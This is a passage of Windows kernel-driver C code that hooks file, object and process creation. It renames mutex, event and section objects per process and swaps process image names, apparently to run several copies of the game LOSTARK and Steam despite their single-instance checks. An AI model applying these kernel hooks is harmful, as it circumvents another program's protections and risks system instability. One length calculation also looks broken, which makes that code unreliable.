							Disposition, CreateOptions, EaBuffer, EaLength,
							CreateFileType, InternalParameters, Options, Flags,
							DriverContext);

						RtlInitUnicodeString(ObjectAttributes->ObjectName, pString);
						ExFreeGlobalMemUser(&MemUser);
						LOG_DEBUG("3--- way:<%08X>\n", RNT);

						return RNT;



					}
				}
			}
			__except (1) {
				LOG_DEBUG(" __except %08X\n", GetExceptionCode());
			}
		}

	//END:
		return TrueIopCreateFile(FileHandle, DesiredAccess, ObjectAttributes,
			IoStatusBlock, AllocationSize, FileAttributes, ShareAccess,
			Disposition, CreateOptions, EaBuffer, EaLength,
			CreateFileType, InternalParameters, Options, Flags,
			DriverContext);
	}
	__except (1) {
		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}

	return 0xC0000034;
}




POBJECT_TYPE* ExMutantObjectType;
extern POBJECT_TYPE* ExEventObjectType;
extern POBJECT_TYPE* MmSectionObjectType;

//#define MAX_PATH 256

#define W_OBJECT_CREATE 0
#define W_OBJECT_OPEN 0

HANDLE dwEventPID = 0;
HANDLE dwMutexPID = 0;
HANDLE dwSectionPID = 0;



//KSPIN_LOCK _SpinLock_Mutex_Event_Section;

//typedef struct _TABLE_HANDLE_INFO
//{
//	LIST_ENTRY Link;
//	HANDLE hID;
//	HANDLE MainThead;
//	HANDLE ModifyID;
//	PVOID Object;
//	HANDLE_TABLE_ENTRY* pCidTable;
//	HANDLE_TABLE_ENTRY TableEntry;
//	HANDLE fID;
//	LIST_ENTRY ThreadListEntry0;
//	LIST_ENTRY ThreadListEntry1;
//	//char pIv[2048];
//
//}TABLE_HANDLE_INFO, * PTABLE_HANDLE_INFO;


extern HANDLE dwPIDsteam;


BOOLEAN wAddMetuxAvl_0(PTABLE_HANDLE_INFO TalbeAvl);
PTABLE_HANDLE_INFO findMetuxAvl_0(PTABLE_HANDLE_INFO TalbeAvl);


BOOLEAN  HandleWithEvent(POBJECT_ATTRIBUTES ObjectAttributes,
	PTABLE_UNICODE_STRING_FILTER pL,
	BOOLEAN bCreate,
	GlobalMemUser* pMemUser)
{

	__try
	{
		wchar_t* Addr = ExAllocateMemUser(MAX_PATH * 2, pMemUser);
		if (Addr != NULL)
		{

			HANDLE hID = 0;
			TABLE_HANDLE_INFO pGr = { 0 };
			pGr.hID = PsGetCurrentProcessId();
			TABLE_HANDLE_INFO* pVl = findMetuxAvl_0(&pGr);
			if (pVl != 0)
			{
				hID = pGr.fID;
				//LOG_DEBUG("MUTEX 0 find,now %d  par %d\n", pVl->hID, pVl->fID);
			}
			else
			{
				pGr.hID = PsGetCurrentProcessId();
				pGr.fID = dwPIDsteam;
				wAddMetuxAvl_0(&pGr);
				LOG_DEBUG("MUTEX 0 ---------------------------------Add,now %d  par %d\n", pGr.hID, pGr.fID);
				hID = dwPIDsteam;
			}
			RtlStringCbPrintfW((LPVOID)Addr, MAX_PATH * 2, L"%ws@%d", ObjectAttributes->ObjectName->Buffer, hID);
			RtlInitUnicodeString(ObjectAttributes->ObjectName, Addr);
			return TRUE;
		}
		return FALSE;
	}
	__except (1) {

		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}
	return FALSE;
}


BOOLEAN  HandleWithMetux(POBJECT_ATTRIBUTES ObjectAttributes,
	PTABLE_UNICODE_STRING_FILTER pL,
	BOOLEAN bCreate,
	GlobalMemUser* pMemUser)
{

	__try
	{
		wchar_t* Addr = ExAllocateMemUser(MAX_PATH * 2, pMemUser);
		if (Addr != NULL)
		{
			HANDLE hID = 0;
			TABLE_HANDLE_INFO pGr = { 0 };
			pGr.hID = PsGetCurrentProcessId();
			TABLE_HANDLE_INFO* pVl = findMetuxAvl_0(&pGr);
			if (pVl != 0)
			{
				hID = pGr.fID;
				//LOG_DEBUG("MUTEX 1 find,now %d  par %d\n", pVl->hID, pVl->fID);
			}
			else
			{
				pGr.hID = PsGetCurrentProcessId();
				pGr.fID = dwPIDsteam;
				wAddMetuxAvl_0(&pGr);
				LOG_DEBUG("MUTEX 1 --------------------------------Add,now %d  par %d\n", pGr.hID, pGr.fID);
				hID = dwPIDsteam;
			}
			RtlStringCbPrintfW((LPVOID)Addr, MAX_PATH * 2, L"%ws@%d", ObjectAttributes->ObjectName->Buffer, hID);
			RtlInitUnicodeString(ObjectAttributes->ObjectName, Addr);
			return TRUE;
		}
		return FALSE;
	}
	__except (1) {
		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());

	}
	return FALSE;
}

BOOLEAN  HandleWithSection(POBJECT_ATTRIBUTES ObjectAttributes,
	PTABLE_UNICODE_STRING_FILTER pL,
	BOOLEAN bCreate,
	GlobalMemUser* pMemUser)
{

	__try
	{
		wchar_t* Addr = ExAllocateMemUser(MAX_PATH * 2, pMemUser);
		if (Addr != NULL)
		{
			HANDLE hID = 0;
			TABLE_HANDLE_INFO pGr = { 0 };
			pGr.hID = PsGetCurrentProcessId();
			TABLE_HANDLE_INFO* pVl = findMetuxAvl_0(&pGr);
			if (pVl != 0)
			{
				hID = pGr.fID;
				LOG_DEBUG("MUTEX 2 find,now %d  par %d\n", pVl->hID, pVl->fID);
			}
			else
			{
				pGr.hID = PsGetCurrentProcessId();
				pGr.fID = dwPIDsteam;
				wAddMetuxAvl_0(&pGr);
				LOG_DEBUG("MUTEX 2 -----------------Add,now %d  par %d\n", pGr.hID, pGr.fID);
				hID = dwPIDsteam;
			}
			RtlStringCbPrintfW(Addr, MAX_PATH * 2, L"%ws_%d", ObjectAttributes->ObjectName->Buffer, hID);
			RtlInitUnicodeString(ObjectAttributes->ObjectName, Addr);
			return TRUE;
		}
	}
	__except (1) {
		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}
	return FALSE;
}



////  只能筛选自己创建的  //
//NTSTATUS wObCreateObjectEx(
//	KPROCESSOR_MODE ProbeMode,
//	POBJECT_TYPE ObjectType,
//	POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
//	KPROCESSOR_MODE OwnershipMode,
//	PVOID ParseContext OPTIONAL,
//	ULONG ObjectBodySize,
//	ULONG PagedPoolCharge,
//	ULONG NonPagedPoolCharge,
//	PVOID* Object,
//	__int64 Flags
//) {
//
//	NTSTATUS rNt = 0;
//
//	if (ObjectAttributes &&
//		ObjectAttributes->ObjectName &&
//		ObjectAttributes->ObjectName->Buffer)
//	{
//
//		__try {
//
//			wchar_t FileName[MAX_PATH] = { 0 };
//			PTABLE_UNICODE_STRING_FILTER pVl = 0;
//
//			if (ObjectType == *IoFileObjectType) {
//				//赛选驱动服务
//				//LOG_DEBUG(L"IoFileObjectType 0 <%ws> [%d]\n", ObjectAttributes->ObjectName->Buffer, PsGetCurrentProcessId());
//
//			}
//
//			if (ObjectType == *ExMutantObjectType ||
//				ObjectType == *ExEventObjectType /*||
//				ObjectType == *MmSectionObjectType*/) {
//
//
//				TABLE_HANDLE_INFO vGr = { 0 };
//				vGr.hID = PsGetCurrentProcessId();
//				PTABLE_HANDLE_INFO pVl = findMetuxAvl_0(&vGr);
//				if (pVl != 0)
//				{
//
//#ifdef DEBUG
//					UCHAR* name = PsGetProcessImageFileName(PsGetCurrentProcess());
//					char tgName[0x20] = { 0 };
//					RtlCopyMemory(tgName, name, 0x10);
//					char* Know = "unkonw";
//					if (ObjectType == *ExMutantObjectType) {
//						//pVl = findMutexAvl(&sFilter);
//						Know = "Mutex";
//					}
//					else if (ObjectType == *ExEventObjectType) {
//						//pVl = findEventAvl(&sFilter);
//						Know = "Event";
//					}
//					else if (ObjectType == *MmSectionObjectType) {
//						//pVl = findSectionAvl(&sFilter);
//						Know = "Section";
//					}
//
//					//LOG_DEBUG("LOSTARK open  %s %s <%ws> [%d]\n", Know, tgName,
//					//	ObjectAttributes->ObjectName->Buffer, PsGetCurrentProcessId());
//#endif // DEBUG
//
//
//
//
//
//					if (ObjectAttributes->ObjectName->Length < MAX_PATH * 2) {
//						RtlCopyMemory(FileName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);
//					}
//					TABLE_UNICODE_STRING_FILTER sFilter = { 0 };
//					RtlInitUnicodeString(&sFilter.stringSrc, FileName);
//
//					PTABLE_UNICODE_STRING_FILTER pUchar = 0;
//					if (ObjectType == *ExMutantObjectType) {
//						//pVl = findMutexAvl(&sFilter);
//						pUchar = findMutexAvl(&sFilter);
//					}
//					else if (ObjectType == *ExEventObjectType) {
//						//pVl = findEventAvl(&sFilter);
//						pUchar = findEventAvl(&sFilter);
//					}
//
//					wchar_t* pString = ObjectAttributes->ObjectName->Buffer;
//					GlobalMemUser MemUser = { 0 };
//					BOOLEAN bHandler = FALSE;
//
//
//#ifdef DEBUG
//					if (((DWORD64)ObjectAttributes->ObjectName->Buffer) & 0xFFF0000000000000) {
//						LOG_DEBUG(" ---------------- Kenerl %I64X\n", ObjectAttributes->ObjectName->Buffer);
//					}
//
//#endif // DEBUG
//
//					if (pUchar == 0)
//					{
//						if (ObjectType == *ExMutantObjectType)
//						{
//							bHandler = HandleWithMetux(ObjectAttributes, pVl, W_OBJECT_CREATE, &MemUser);
//						}
//						else if (ObjectType == *ExEventObjectType)
//						{
//							bHandler = HandleWithEvent(ObjectAttributes, pVl, W_OBJECT_CREATE, &MemUser);
//						}
//					}
//					else
//					{
//						RtlInitUnicodeString(ObjectAttributes->ObjectName, pUchar->stringReplace.Buffer);
//					}
//					if (bHandler)
//					{
//#ifdef DEBUG
//						if (ObjectType == *ExMutantObjectType)
//						{
//							LOG_DEBUG("createMutant %ws <%08X>[%d]\n", ObjectAttributes->ObjectName->Buffer, rNt, PsGetCurrentProcessId());
//						}
//						else if (ObjectType == *ExEventObjectType)
//						{
//							LOG_DEBUG("createEvent %ws <%08X>[%d]\n", ObjectAttributes->ObjectName->Buffer, rNt, PsGetCurrentProcessId());
//						}
//#endif // DEBUG
//
//						rNt = TrueObCreateObjectEx(ProbeMode, ObjectType, ObjectAttributes, OwnershipMode, ParseContext,
//							ObjectBodySize, PagedPoolCharge, NonPagedPoolCharge, Object, Flags);
//						//RtlInitUnicodeString(ObjectAttributes->ObjectName, pString);
//						//ExFreeGlobalMemUser(&MemUser);
//
//
//						if (NT_SUCCESS(rNt))
//						{
//
//							if (pUchar == 0)
//							{
//								UNICODE_STRING uBuffer;
//								TABLE_UNICODE_STRING_FILTER sFilter = { 0 };
//								RtlInitUnicodeString(&sFilter.stringReplace, ObjectAttributes->ObjectName->Buffer);
//
//								RtlInitUnicodeString(&uBuffer, pString);
//
//								wchar_t* pFileName = ExAllocatePoolWithTag(PagedPool, MAX_PATH * 2, 'tag');
//								RtlZeroMemory(pFileName, MAX_PATH * 2);
//								if (ObjectAttributes->ObjectName->Length < MAX_PATH * 2) {
//									RtlCopyMemory(pFileName, uBuffer.Buffer, uBuffer.Length);
//								}
//
//								RtlInitUnicodeString(&sFilter.stringSrc, pFileName);
//
//
//
//
//								if (ObjectType == *ExMutantObjectType)
//								{
//									if (wAddMutexAvl(&sFilter))
//									{
//										LOG_DEBUG("create AddMutex %wZ <%08X>[%d]\n", &sFilter.stringSrc, rNt, PsGetCurrentProcessId());
//									}
//
//								}
//								else if (ObjectType == *ExEventObjectType)
//								{
//									if (wAddEventAvl(&sFilter))
//									{
//										LOG_DEBUG("create AddEvent %wZ <%08X>[%d]\n", &sFilter.stringSrc, rNt, PsGetCurrentProcessId());
//									}
//								}
//							}
//
//
//
//
//
//
//
//
//
//						}
//
//
//
//						//rNt = TrueObCreateObjectEx(ProbeMode, ObjectType, ObjectAttributes, OwnershipMode, ParseContext,
//						//	ObjectBodySize, PagedPoolCharge, NonPagedPoolCharge, Object, Flags);
//						//
//
//#ifdef DEBUG
//						if (!NT_SUCCESS(rNt))
//						{
//							if (ObjectType == *ExMutantObjectType)
//							{
//								LOG_DEBUG("createMutant ERROR %ws <%08X>[%d]\n", ObjectAttributes->ObjectName->Buffer, rNt, PsGetCurrentProcessId());
//							}
//							else if (ObjectType == *ExEventObjectType)
//							{
//								LOG_DEBUG("createEvent ERROR %ws <%08X>[%d]\n", ObjectAttributes->ObjectName->Buffer, rNt, PsGetCurrentProcessId());
//							}
//						}
//#endif // DEBUG
//
//
//
//
//						//LOG_DEBUG("ERROR  [%08X][%d]\n", rNt, PsGetCurrentProcessId());
//
//						RtlInitUnicodeString(ObjectAttributes->ObjectName, pString);
//						ExFreeGlobalMemUser(&MemUser);
//						return rNt;
//					}
//				}
//
//
//				//RtlZeroMemory(FileName, sizeof(FileName));
//				//if (ObjectAttributes->ObjectName->Length < sizeof(FileName)) {
//				//	RtlCopyMemory(FileName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);
//				//}
//				//TABLE_UNICODE_STRING_FILTER sFilter = { 0 };
//				//RtlInitUnicodeString(&sFilter.stringSrc, FileName);
//
//				//if (ObjectType == *ExMutantObjectType){
//				//	pVl = findMutexAvl(&sFilter);
//				//}
//				//else if (ObjectType == *ExEventObjectType){
//				//	pVl = findEventAvl(&sFilter);
//				//}
//				//else if (ObjectType == *MmSectionObjectType) {
//				//	pVl = findSectionAvl(&sFilter);
//				//}
//
//				//UCHAR* name = PsGetProcessImageFileName(PsGetCurrentProcess());
//				//char tgName[0x20] = { 0 };
//				//RtlCopyMemory(tgName, name, 0x10);
//				//if (_stricmp("LOSTARK.exe", tgName) == 0)
//				//{
//
//				//	char* Know = "unkonw";
//				//	if (ObjectType == *ExMutantObjectType) {
//				//		//pVl = findMutexAvl(&sFilter);
//				//		Know = "Mutex";
//				//	}
//				//	else if (ObjectType == *ExEventObjectType) {
//				//		//pVl = findEventAvl(&sFilter);
//				//		Know = "Event";
//				//	}
//				//	else if (ObjectType == *MmSectionObjectType) {
//				//		//pVl = findSectionAvl(&sFilter);
//				//		Know = "Section";
//				//	}
//				//	LOG_DEBUG("LOSTARK create  %s <%ws> [%d]\n", Know,
//				//		ObjectAttributes->ObjectName->Buffer, PsGetCurrentProcessId());
//				//}
//
//			}
//			//if (pVl != 0)
//			//{
//			//	wchar_t* pString = ObjectAttributes->ObjectName->Buffer;
//			//	GlobalMemUser MemUser = { 0 };
//			//	BOOLEAN bHandler = FALSE;
//			//	if (ObjectType == *ExMutantObjectType) {
//			//		bHandler = HandleWithMetux(ObjectAttributes, pVl,W_OBJECT_CREATE, &MemUser);
//			//		if (bHandler)
//			//		{
//			//			LOG_DEBUG("MUTEX 0 create %ws\n", ObjectAttributes->ObjectName->Buffer);
//			//		}
//			//	}
//			//	else if (ObjectType == *ExEventObjectType) {
//			//		bHandler = HandleWithEvent(ObjectAttributes, pVl , W_OBJECT_CREATE ,&MemUser);
//			//		if (bHandler)
//			//		{
//			//			LOG_DEBUG("MUTEX 1 create %ws\n", ObjectAttributes->ObjectName->Buffer);
//			//		}
//			//	}
//			//	else if (ObjectType == *MmSectionObjectType) {
//			//		bHandler = HandleWithSection(ObjectAttributes, pVl, W_OBJECT_CREATE, &MemUser);
//			//		if (bHandler)
//			//		{
//			//			LOG_DEBUG("MUTEX 2 create %ws\n", ObjectAttributes->ObjectName->Buffer);
//			//		}
//			//	}
//			//	if (bHandler)
//			//	{
//			//		rNt = TrueObCreateObjectEx(ProbeMode, ObjectType, ObjectAttributes, OwnershipMode, ParseContext,
//			//			ObjectBodySize, PagedPoolCharge, NonPagedPoolCharge, Object, Flags);
//			//		RtlInitUnicodeString(ObjectAttributes->ObjectName, pString);
//			//		ExFreeGlobalMemUser(&MemUser);
//
//			//		if (!NT_SUCCESS(rNt))
//			//		{
//			//			LOG_DEBUG("ERROR  [%08X][%d]\n", rNt, PsGetCurrentProcessId());
//			//		}
//
//			//		return rNt;
//			//	}
//			//}
//		}
//		__except (1) {
//
//			LOG_DEBUG("__except [%d]", __LINE__);
//		}
//	}
//
//END:
//	rNt = TrueObCreateObjectEx(ProbeMode,
//		ObjectType,
//		ObjectAttributes,
//		OwnershipMode,
//		ParseContext,
//		ObjectBodySize,
//		PagedPoolCharge,
//		NonPagedPoolCharge,
//		Object,
//		Flags);
//
//
//
//	//STATUS_ABANDON_HIBERFILE
//
//#ifdef DEBUG
//	if (NT_SUCCESS(rNt))
//	{
//		return rNt;
//	}
//
//
//	//TABLE_HANDLE_INFO vGr = { 0 };
//	//vGr.hID = PsGetCurrentProcessId();
//	//PTABLE_HANDLE_INFO pVl = findMetuxAvl_0(&vGr);
//	//if (pVl != 0)
//	//{
//	//	char* Know = "unkonw";
//	//	if (ObjectType == *ExMutantObjectType) {
//	//		//pVl = findMutexAvl(&sFilter);
//	//		Know = "Mutex";
//	//	}
//	//	else if (ObjectType == *ExEventObjectType) {
//	//		//pVl = findEventAvl(&sFilter);
//	//		Know = "Event";
//	//	}
//	//	else if (ObjectType == *MmSectionObjectType) {
//	//		//pVl = findSectionAvl(&sFilter);
//	//		Know = "Section";
//	//	}
//
//
//	//	if (ObjectAttributes &&
//	//		ObjectAttributes->ObjectName &&
//	//		ObjectAttributes->ObjectName->Buffer)
//	//	{
//	//		LOG_DEBUG("error create 0 %s <%ws> [%08X][%d]\n", Know, ObjectAttributes->ObjectName->Buffer, rNt, PsGetCurrentProcessId());
//	//	}
//	//	else
//	//	{
//	//		LOG_DEBUG("error %s [%08X][%d]\n", Know, rNt, PsGetCurrentProcessId());
//	//	}
//	//}
//
//
//
//
//	//UCHAR* name = PsGetProcessImageFileName(PsGetCurrentProcess());
//	//char tgName[0x20] = { 0 };
//	//RtlCopyMemory(tgName, name, 0x10);
//	//if (_stricmp("LOSTARK.exe", tgName) == 0)
//	//{
//
//	//}
//#endif // DEBUG
//	return rNt;
//}
//
//NTSTATUS  wObOpenObjectByName(
//	POBJECT_ATTRIBUTES ObjectAttributes,
//	POBJECT_TYPE ObjectType OPTIONAL,
//	KPROCESSOR_MODE AccessMode,
//	PACCESS_STATE AccessState OPTIONAL,
//	ACCESS_MASK DesiredAccess OPTIONAL,
//	PVOID ParseContext OPTIONAL,
//	PHANDLE Handle
//) {
//	NTSTATUS rNt = 0;
//	if (ObjectAttributes &&
//		ObjectAttributes->ObjectName &&
//		ObjectAttributes->ObjectName->Buffer)
//	{
//		__try {
//
//
//
//			wchar_t FileName[MAX_PATH] = { 0 };
//			PTABLE_UNICODE_STRING_FILTER pVl = 0;
//			if (ObjectType == *ExMutantObjectType ||
//				ObjectType == *ExEventObjectType /*||
//				ObjectType == *MmSectionObjectType*/) {
//
//				/*RtlZeroMemory(FileName, 256);
//				if (ObjectAttributes->ObjectName->Length < 256) {
//					RtlCopyMemory(FileName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);
//				}
//				TABLE_UNICODE_STRING_FILTER sFilter = { 0 };
//				RtlInitUnicodeString(&sFilter.stringSrc, FileName);
//
//				if (ObjectType == *ExMutantObjectType) {
//					pVl = findMutexAvl(&sFilter);
//				}
//				else if (ObjectType == *ExEventObjectType) {
//					pVl = findEventAvl(&sFilter);
//				}
//				else if (ObjectType == *MmSectionObjectType) {
//					pVl = findSectionAvl(&sFilter);
//				}*/
//
//				//if (ObjectType == *ExMutantObjectType ||
//				//	ObjectType == *ExEventObjectType)
//				//{
//
//
//
//
//				UCHAR* name = PsGetProcessImageFileName(PsGetCurrentProcess());
//				char tgName[0x20] = { 0 };
//				RtlCopyMemory(tgName, name, 0x10);
//
//				//if (_stricmp("LOSTARK.exe", tgName) == 0 ||
//				//	_stricmp("steam.exe", tgName) == 0)
//				//{
//
//
//				//}
//
//
//
//				TABLE_HANDLE_INFO vGr = { 0 };
//				vGr.hID = PsGetCurrentProcessId();
//				PTABLE_HANDLE_INFO pVl = findMetuxAvl_0(&vGr);
//
//				if (pVl != 0)
//				{
//
//#ifdef DEBUG
//					char* Know = "unkonw";
//
//					if (ObjectType == *ExMutantObjectType) {
//						//pVl = findMutexAvl(&sFilter);
//						Know = "Mutex";
//					}
//					else if (ObjectType == *ExEventObjectType) {
//						//pVl = findEventAvl(&sFilter);
//						Know = "Event";
//					}
//					else if (ObjectType == *MmSectionObjectType) {
//						//pVl = findSectionAvl(&sFilter);
//						Know = "Section";
//					}
//
//#endif // DEBUG
//					//wchar_t* pFileName = ExAllocatePoolWithTag(NonPagedPool, MAX_PATH * 2, 'tag');
//					//RtlZeroMemory(FileName, MAX_PATH * 2);
//					if (ObjectAttributes->ObjectName->Length < MAX_PATH * 2) {
//						RtlCopyMemory(FileName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);
//					}
//					TABLE_UNICODE_STRING_FILTER sFilter = { 0 };
//					RtlInitUnicodeString(&sFilter.stringSrc, FileName);
//
//
//
//					PTABLE_UNICODE_STRING_FILTER pUchar = 0;
//					if (ObjectType == *ExMutantObjectType) {
//						//pVl = findMutexAvl(&sFilter);
//						pUchar = findMutexAvl(&sFilter);
//					}
//					else if (ObjectType == *ExEventObjectType) {
//						//pVl = findEventAvl(&sFilter);
//						pUchar = findEventAvl(&sFilter);
//					}
//
//#ifdef DEBUG
//					LOG_DEBUG("open 0 %s %s <%ws> [%d]\n", Know, tgName,
//						FileName, PsGetCurrentProcessId());
//#endif // DEBUG
//
//
//					if (pUchar != 0)
//					{
//						wchar_t* pString = ObjectAttributes->ObjectName->Buffer;
//
//						GlobalMemUser MemUser = { 0 };
//						BOOLEAN bHandler = FALSE;
//
//
//
//						if (ObjectType == *ExMutantObjectType)
//						{
//							bHandler = HandleWithMetux(ObjectAttributes, pVl, W_OBJECT_CREATE, &MemUser);
//						}
//						else if (ObjectType == *ExEventObjectType)
//						{
//							bHandler = HandleWithEvent(ObjectAttributes, pVl, W_OBJECT_CREATE, &MemUser);
//						}
//
//						//RtlInitUnicodeString(ObjectAttributes->ObjectName, pUchar->stringReplace.Buffer);
//
//
//#ifdef DEBUG
//						LOG_DEBUG("open 1  %s %s <%ws> [%d]\n", Know, tgName,
//							ObjectAttributes->ObjectName->Buffer, PsGetCurrentProcessId());
//#endif // DEBUG
//						//
//						//#ifdef DEBUG
//						//						if (((DWORD64)ObjectAttributes->ObjectName->Buffer) & 0xFFF0000000000000) {
//						//							LOG_DEBUG(" ---------------- Kener2 %I64X\n", ObjectAttributes->ObjectName->Buffer);
//						//						}
//						//
//						//#endif // DEBUG
//
//												//bHandler = HandleWithMetux(ObjectAttributes, pVl, W_OBJECT_OPEN, &MemUser);
//						if (bHandler)
//						{
//
//#ifdef DEBUG
//							LOG_DEBUG("open 2  %s %s <%ws> [%d]\n", Know, tgName,
//								ObjectAttributes->ObjectName->Buffer, PsGetCurrentProcessId());
//#endif // DEBUG
//
//							rNt = TrueObOpenObjectByName(ObjectAttributes,
//								ObjectType,
//								AccessMode,
//								AccessState,
//								DesiredAccess,
//								ParseContext,
//								Handle);
//
//
//
//#ifdef DEBUG
//
//							if (ObjectType == *ExMutantObjectType)
//							{
//								LOG_DEBUG("openMutant %ws <%08X>[%d]\n", ObjectAttributes->ObjectName->Buffer, rNt, PsGetCurrentProcessId());
//							}
//							else if (ObjectType == *ExEventObjectType)
//							{
//								LOG_DEBUG("openEvent %ws <%08X>[%d]\n", ObjectAttributes->ObjectName->Buffer, rNt, PsGetCurrentProcessId());
//							}
//
//							if (!NT_SUCCESS(rNt))
//							{
//								//rNt = TrueObOpenObjectByName(ObjectAttributes,
//								//	ObjectType,
//								//	AccessMode,
//								//	AccessState,
//								//	DesiredAccess,
//								//	ParseContext,
//								//	Handle);
//								if (ObjectType == *ExMutantObjectType)
//								{
//									LOG_DEBUG("openMutant %ws <%08X>[%d]\n", ObjectAttributes->ObjectName->Buffer, rNt, PsGetCurrentProcessId());
//								}
//								else if (ObjectType == *ExEventObjectType)
//								{
//									LOG_DEBUG("openEvent %ws <%08X>[%d]\n", ObjectAttributes->ObjectName->Buffer, rNt, PsGetCurrentProcessId());
//								}
//							}
//#endif // DEBUG
//
//							RtlInitUnicodeString(ObjectAttributes->ObjectName, pString);
//							ExFreeGlobalMemUser(&MemUser);
//							return rNt;
//						}
//					}
//				}
//
//
//
//				//	if (_stricmp("steam.exe", name) == 0 ||
//				//		_stricmp("LOSTARK.exe", name) == 0)
//				//	{
//				//		pVl = 1;
//				//		UNICODE_STRING ge; //=// RTL_CONSTANT_STRING(L"IPCWRAPPER");
//				//		//WCHAR WID[128] = {0};
//				//		//RtlStringCbPrintfW(WID, 128, L"%d", PsGetCurrentProcessId());
//				//		RtlInitUnicodeString(&ge, L"*IPCWRAPPER");
//				//		if (FsRtlIsNameInExpression(&ge, ObjectAttributes->ObjectName, TRUE, NULL))
//				//		{
//				//			pVl = 0;
//				//		}
//				//		RtlInitUnicodeString(&ge, L"*READY");
//				//		if (FsRtlIsNameInExpression(&ge, ObjectAttributes->ObjectName, TRUE, NULL))
//				//		{
//				//			pVl = 0;
//				//		}
//
//				//		RtlInitUnicodeString(&ge, L"Local\\1Immersive*");
//				//		if (FsRtlIsNameInExpression(&ge, ObjectAttributes->ObjectName, FALSE, NULL))
//				//		{
//				//			pVl = 0;
//				//		}
//				//	}
//				//}
//				//if (ObjectType == *MmSectionObjectType)
//				//{
//				//	pVl = findSectionAvl(&sFilter);
//				//}
//
//			}
//			//if (pVl != 0)
//			//{
//			//	wchar_t* pString = ObjectAttributes->ObjectName->Buffer;
//			//	GlobalMemUser MemUser = { 0 };
//			//	BOOLEAN bHandler = FALSE;
//			//	if (ObjectType == *ExMutantObjectType) {
//			//		bHandler = HandleWithMetux(ObjectAttributes, pVl, W_OBJECT_OPEN, &MemUser);
//			//		if (bHandler)
//			//		{
//			//			LOG_DEBUG("MUTEX 0 open %ws\n", ObjectAttributes->ObjectName->Buffer);
//			//		}
//			//	}
//			//	else if (ObjectType == *ExEventObjectType) {
//			//		bHandler = HandleWithEvent(ObjectAttributes, pVl, W_OBJECT_OPEN, &MemUser);
//			//		if (bHandler)
//			//		{
//			//			LOG_DEBUG("MUTEX 1 open %ws\n", ObjectAttributes->ObjectName->Buffer);
//			//		}
//			//	}
//			//	else if (ObjectType == *MmSectionObjectType) {
//			//		bHandler = HandleWithSection(ObjectAttributes, pVl, W_OBJECT_OPEN, &MemUser);
//			//		if (bHandler)
//			//		{
//			//			LOG_DEBUG("MUTEX 2 open %ws\n", ObjectAttributes->ObjectName->Buffer);
//			//		}
//			//	}
//			//	if (bHandler)
//			//	{
//			//		rNt = TrueObOpenObjectByName(ObjectAttributes,
//			//			ObjectType,
//			//			AccessMode,
//			//			AccessState,
//			//			DesiredAccess,
//			//			ParseContext,
//			//			Handle);
//			//		RtlInitUnicodeString(ObjectAttributes->ObjectName, pString);
//			//		ExFreeGlobalMemUser(&MemUser);
//
//			//		if (!NT_SUCCESS(rNt))
//			//		{
//			//			LOG_DEBUG("ERROR  [%08X][%d]\n",rNt, PsGetCurrentProcessId());
//			//		}
//
//			//		return rNt;
//			//	}
//			//}
//		}
//		__except (1) {
//			LOG_DEBUG("__except [%d]\n", __LINE__);
//		}
//	}
//
//END:
//	rNt = TrueObOpenObjectByName(ObjectAttributes,
//		ObjectType,
//		AccessMode,
//		AccessState,
//		DesiredAccess,
//		ParseContext,
//		Handle);
//
//
//#ifdef DEBUG
//
//
//	//TABLE_HANDLE_INFO vGr = { 0 };
//	//vGr.hID = PsGetCurrentProcessId();
//	//PTABLE_HANDLE_INFO pVl = findMetuxAvl_0(&vGr);
//	//if (pVl != 0)
//	//{
//	//	if (!NT_SUCCESS(rNt))
//	//	{
//
//
//	//		char* Know = "unkonw";
//	//		if (ObjectType == *ExMutantObjectType) {
//	//			//pVl = findMutexAvl(&sFilter);
//	//			Know = "Mutex";
//	//		}
//	//		else if (ObjectType == *ExEventObjectType) {
//	//			//pVl = findEventAvl(&sFilter);
//	//			Know = "Event";
//	//		}
//	//		else if (ObjectType == *MmSectionObjectType) {
//	//			//pVl = findSectionAvl(&sFilter);
//	//			Know = "Section";
//	//		}
//	//		if (ObjectAttributes &&
//	//			ObjectAttributes->ObjectName &&
//	//			ObjectAttributes->ObjectName->Buffer)
//	//		{
//	//			LOG_DEBUG("ERROR open %s <%ws> [%08X][%d]\n", Know, ObjectAttributes->ObjectName->Buffer, rNt, PsGetCurrentProcessId());
//	//		}
//	//		else
//	//		{
//	//			LOG_DEBUG("ERROR open  [%08X][%d]\n", Know, rNt, PsGetCurrentProcessId());
//	//		}
//
//	//	}
//
//	//}
//#endif // DEBUG
//	return rNt;
//}













NTSTATUS __fastcall wPspCreateProcess(
	PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
	HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort)
{


	if (ObjectAttributes &&
		ObjectAttributes->ObjectName &&
		ObjectAttributes->ObjectName->Length) {

		LOG_DEBUG("1---way: %ws\n", ObjectAttributes->ObjectName->Buffer);
		__try {
			wchar_t FileName[256] = { 0 };
			LONG iPos = findUnicodeWchar(ObjectAttributes->ObjectName, '\\');
			if (iPos != -1) {

				DWORD cLen = ObjectAttributes->ObjectName->Length - (iPos + 1);
				if (cLen > sizeof(FileName))
				{
					LOG_DEBUG("ERROR: Size:%d\n", cLen);
				}
				else
				{
					__try {

						RtlCopyMemory(FileName, &ObjectAttributes->ObjectName->Buffer[iPos + 1], cLen);
					}
					__except (1) {
						LOG_DEBUG("__except  Len %d\n", ObjectAttributes->ObjectName->Length - (iPos + 1));
					}
					//LOG_DEBUG("1---way: %ws\n", FileName);
					TABLE_UNICODE_STRING_FILTER sFilter = { 0 };
					RtlInitUnicodeString(&sFilter.stringSrc, FileName);
					PTABLE_UNICODE_STRING_FILTER pVl = findUnicodeStringAvl(&sFilter);
					if (pVl != 0) {
						LOG_DEBUG("1---way: %ws\n", FileName);
						RtlInitUnicodeString(ObjectAttributes->ObjectName, pVl->stringReplace.Buffer);

					}


				}
			}
		}
